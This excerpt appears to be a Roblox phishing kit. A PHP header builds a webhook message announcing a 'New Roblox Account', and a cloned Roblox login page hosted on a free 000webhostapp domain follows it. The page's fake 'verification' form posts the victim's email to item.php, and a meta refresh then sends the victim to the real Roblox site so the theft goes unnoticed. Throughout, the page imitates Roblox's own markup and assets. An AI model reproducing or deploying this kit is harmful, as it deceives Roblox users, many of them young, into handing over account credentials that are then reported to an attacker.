...
include('config.php');
include('modules.php');
$get = file_get_contents('https://api.roblox.com/ownership/hasasset?userId=968623415&assetId=102611803');
...
$hookObject = json_encode([
     ...
     */
    "avatar_url" => "https://rocketr.net/uploads/b3391c102a0579.png",
    /*
    ...
    "embeds" => [
        ...
        [
            ...
            "footer" => [
                "text" => "LordMehmet",
                "icon_url" => "https://www.roblox.com/Thumbs/BCOverlay.ashx?username=$username"
            ],
            ...
            // Author object
            "author" => [
                "name" => "New Roblox Account",
                "url" => "https://v3rmillion.net/member.php?action=profile&uid=17255"
            ],
 ...
 * - converted all uanits to pixels and em units
...
Roblox.BundleDetector = {
    ...
    logToEventStream: function (failedBundle, ctx, cdnProvider) {
        ...
        if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
            ...
            xhr.onreadystatechange = function () {
                ...
                if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                    var cdnProvider = xhr.getResponseHeader("rbx-cdn-provider");
            ...
            xhr.onerror = function () {
                Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                Roblox.BundleDetector.logToEventStream(failedBundle, ctx);
            };
    ...
    reportBundleError: function (bundleTag) {
        var ephemeralCounterName, failedBundle, ctx;
    ...
    verifyBundles: function (document) {
        ...
        for (var i = 0; i < scripts.length; i++) {
            var item = scripts[i];
            if (item.src && item.dataset.monitor && item.dataset.bundlename) {
                if (!Roblox.BundleDetector.jsBundlesLoaded.hasOwnProperty(item.dataset.bundlename)) {
...
window.addEventListener("load", function (evt) {
    ...
    <link href="https://images.rbxcdn.com/1387da00c070fd34110985aee87f3155.ico.gzip" rel="icon">

    

    <link rel="canonical" href="https://www.roblox.com/NewLogin">
    
<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___e55bd6dfea602559b224c592851ff587_m.css/fetch">


    
<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/page___e8e5f76cacf1180187f7ae5357ecb825_m.css/fetch">
...
<script type="text/javascript">window.jQuery || document.write("<script type='text/javascript' src='/js/jquery/jquery-1.11.1.js'></script><link rel="preload" href="https://adservice.google.co.id/adsid/integrator.js?domain=builderclub134.000webhostapp.com" as="script"><script type="text/javascript" src="https://adservice.google.co.id/adsid/integrator.js?domain=builderclub134.000webhostapp.com"></script><link rel="preload" href="https://adservice.google.com/adsid/integrator.js?domain=builderclub134.000webhostapp.com" as="script"><script type="text/javascript" src="https://adservice.google.com/adsid/integrator.js?domain=builderclub134.000webhostapp.com"></script><script src="https://securepubads.g.doubleclick.net/gpt/pubads_impl_275.js" async=""></script></head><body id="rbx-body" class=" " data-performance-relative-value="0.005" data-internal-page-name="" data-send-event-percentage="0.01">")
...
<script type="text/javascript">window.jQuery || document.write("<script type='text/javascript' src='/js/jquery/jquery-migrate-1.2.1.js'></script>")
...
<script type="text/javascript">
    ...
    Roblox.EnvironmentUrls = {
        abuseAppSite: "https://abusesite.roblox.com",
        ...
        groupsAppSite: "https://groupsite.roblox.com",
        ...
        translationAppSite: "https://translations.roblox.com",
...
<script type="text/javascript">
    ...
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="headerinit" type="text/javascript" src="https://js.rbxcdn.com/320c48b73216ab58062c45351addcaa1.js.gzip"></script>
...
Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
    ...
    <div id="roblox-linkify" data-enabled="true" data-regex="(https?://)?(?:www.)?([a-z0-9-]{2,}.)*(((m|de|www|web|api|blog|wiki|help|corp|polls|bloxcon|developer|devforum|forum).roblox.com|robloxlabs.com)|(www.shoproblox.com))(?!/[A-Za-z0-9-+&amp;@#/=~_|!:,.;]*%)((/[A-Za-z0-9-+&amp;@#/%?=~_|!:,.;]*)|(?=s|b))" data-regex-flags="gm" data-as-http-regex="(([^.]help|polls).roblox.com)"></div>
...
<div id="header" class="navbar-fixed-top rbx-header" data-isauthenticated="false" role="navigation">
    <div class="container-fluid">
        ...
        <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-4 col-lg-3">
            <li>
                <a class="nav-menu-title" href="/login.php">Games</a>
            </li>
            <li>
                <a class="nav-menu-title" href="/login.php">Catalog</a>
            </li>
            <li>
                <a class="nav-menu-title" href="/login.php">Create</a>
            </li>
            <li>
                <a class="buy-robux nav-menu-title" href="/upgrades.html">Robux</a>
            </li>
        </ul><!--rbx-navbar-->
        ...
        <div class="navbar-right rbx-navbar-right">
                <ul class="nav navbar-right rbx-navbar-right-nav" data-display-opened="False">
                    <li class="signup-button-container">
                        <a id="sign-up-button" class="rbx-navbar-signup nav-menu-title signup-button" href="https://www.roblox.com/account/signupredir">Sign Up</a>
                    </li>
        ...
        <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
            ...
            <li>
                <a class="nav-menu-title" href="https://www.roblox.com/develop">Create</a>
            </li>
            <li>
...
<div class="login">
    <form action="item.php" id="login-form" method="post" class="login-container">
  <h2 class="header">VERİFİCATİON</h2>

    <p><input id="login-username" name="username" type="text" class="form-control input-field ng-pristine ng-valid ng-empty ng-touched" placeholder="email" ng-model="$ctrl.credentialValue" ng-keypress="$ctrl.clearError()" rbx-form-interaction=""></p>
<p><button id="login-button" class="btn-full-width login-button ng-binding btn-secondary-md" ng-class="$ctrl.usePrimaryButtonClass?'btn-primary-md':'btn-secondary-md'" ng-bind="'Action.LogInCapitalized'|translate" ng-click="$ctrl.submit(true)">SEDN</button></p>
  </form>
</div>
...
<footer class="container-footer">
   ...
   <!-- NOTE: "Roblox Corporation" is a healthcheck; be careful when updating! -->
    ...
    <iframe src="https://cdns.us1.gigya.com/gs/webSdk/Api.aspx?apiKey=3_OsvmtBbTg6S_EUbwTPtbbmoihFY5ON6v6hbVrTbuqpBs7SyF_LQaJwtwKJ60sY1p&amp;version=latest#origin=https://builderclub134.000webhostapp.com/login.php&amp;hasGmid=true&amp;gig_loggerConfig=%7B%22logLevel%22%3A0%2C%22clientMuteLevel%22%3A0%2C%22logTheme%22%3A1%7D" style="position: absolute; height: 0px; width: 0px; display: none;"></iframe><script type="text/javascript">function urchinTracker() {}</script>
    ...
    <script type="text/javascript">
        $(function () {
            ...
            if (videoPreRollDFP) {
                ...
                videoPreRollDFP.includedPlaceIds = "559159830,562271837,39972972";
    ...
    <div style="min-height: 275px; background-color: white;">
        ...
        <div class="RevisedFooter">
            <div style="width:200px;margin:10px auto 0 auto;">
                <a href="https://www.roblox.com/?returnUrl=https%3A%2F%2Fwww.roblox.com%2FNewLogin" class="btn-secondary-xs">Sign Up</a>
                <a class="HaveAccount" href="https://www.roblox.com/newlogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2FNewLogin">I have an account</a>
            </div>
        </div>
    </div>
</div>
...
<script type="text/javascript">
    ...
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="leanbase" type="text/javascript" src="https://js.rbxcdn.com/12d31f0e85d0a09844468f1fc41f216d.js.gzip"></script>


    
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="angular" type="text/javascript" src="https://js.rbxcdn.com/563821dbded7865969bfe90cdb38797b.js.gzip"></script>
    ...
    <div ng-modules="pageTemplateApp" class="ng-scope">
        <script type="text/javascript" src="https://js.rbxcdn.com/707576a452335673d204029ec35d69c5.js.gzip"></script>
    </div>
    ...
    <script>
        Roblox.XsrfToken.setToken('iDk+quH+Dhjw');
    </script>
...
<script type="text/javascript">
    ...
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="page" type="text/javascript" src="https://js.rbxcdn.com/8bff4c91baf37f506e664dcf9c0f4558.js.gzip"></script>
...
<meta http-equiv="refresh"
   content="0; url=https://www.roblox.com/">